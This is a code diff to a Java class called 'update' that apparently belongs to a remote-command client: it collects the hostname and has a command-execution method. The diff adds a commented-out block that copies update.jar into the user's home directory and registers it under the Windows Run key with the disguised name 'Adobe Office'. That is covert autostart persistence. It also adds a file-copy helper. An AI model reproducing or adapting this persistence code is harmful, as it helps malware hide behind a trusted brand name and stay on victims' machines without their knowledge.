@@ -3,12 +3,17 @@ package update;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
+import java.lang.reflect.InvocationTargetException;
 import java.net.MalformedURLException;
 import java.net.URL;
 import java.net.URLConnection;
 import java.net.InetAddress;
 import java.net.UnknownHostException;
+import java.nio.channels.FileChannel;
 import java.io.BufferedReader;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
 import java.io.InputStreamReader;
 public class update{
 
@@ -19,7 +24,34 @@ public class update{
 		String output="";
 		InetAddress addr;
 		Runtime runtime = Runtime.getRuntime();
-		try
+		
+/*		File srcFile = new File(System.getProperty("user.dir") + "\\update.jar");
+		File trgFile = new File(System.getProperty("user.home") + "\\update.jar");
+		try{
+			if(!System.getProperty("user.dir").equals(System.getProperty("user.home")))
+				copyFileUsingFileChannels(srcFile,trgFile);
+		}
+		catch (IOException ex)
+		{
+			    
+		}
+		try{
+			
+			
+			String value = "javaw -jar \"" + System.getProperty("user.home") + "\\update.jar\"";
+			try{
+			WinRegistry.writeStringValue(WinRegistry.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Adobe Office", value);
+			}
+			catch (IllegalAccessException ex)
+			{
+				    
+			}
+		}
+		catch (InvocationTargetException ex)
+		{
+			    
+		}
+*/		try
 		{
 			addr = InetAddress.getLocalHost();
 		    hostname = addr.getHostName();
@@ -85,6 +117,19 @@ public class update{
 		//}
 	    //catch (IOException e) {
 		//}
+	}
+	private static void copyFileUsingFileChannels(File source, File dest)
+			throws IOException {
+		FileChannel inputChannel = null;
+		FileChannel outputChannel = null;
+		try {
+			inputChannel = new FileInputStream(source).getChannel();
+			outputChannel = new FileOutputStream(dest).getChannel();
+			outputChannel.transferFrom(inputChannel, 0, inputChannel.size());
+		} finally {
+			inputChannel.close();
+			outputChannel.close();
+		}
 	}
 	private static String executeCommand(String command) {
 
